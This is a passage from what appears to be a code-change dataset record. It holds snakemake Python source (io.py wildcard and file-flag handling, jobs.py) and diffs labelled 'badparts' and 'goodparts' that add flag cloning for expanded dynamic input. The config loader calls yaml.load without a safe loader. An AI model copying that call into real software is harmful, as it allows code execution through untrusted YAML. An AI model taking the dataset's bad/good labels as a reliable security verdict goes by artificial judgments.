os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"}, "/snakemake/jobs.py": {"changes": [{"diff": "\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n", "add": 1, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"], "goodparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]}, {"diff": "\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n", "add": 34, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["                    yield IOFile(f, self.rule)"], "goodparts": ["                    fileToYield = IOFile(f, self.rule)", "                    fileToYield.clone_flags(f_)", "                    yield fileToYield", "            else:", "                yield f", "    @property", "    def expanded_input(self):", "        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"", "        for f, f_ in zip(self.input, self.rule.input):", "            if not type(f_).__name__ == \"function\":", "                if type(f_.file).__name__ not in [\"str\", \"function\"]:", "                    if contains_wildcard(f_):", "                        expansion = self.expand_dynamic(", "                            f_,", "                            restriction=self.wildcards,", "                            omit_value=_IOFile.dynamic_fill)", "                        if not expansion:", "                            yield f_", "                        for f, _ in expansion:", "                            fileToYield = IOFile(f, self.rule)", "                            fileToYield.clone_flags(f_)", "                            yield fileToYield", "                    else:", "                        yield f", "                else:", "                    yield f"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        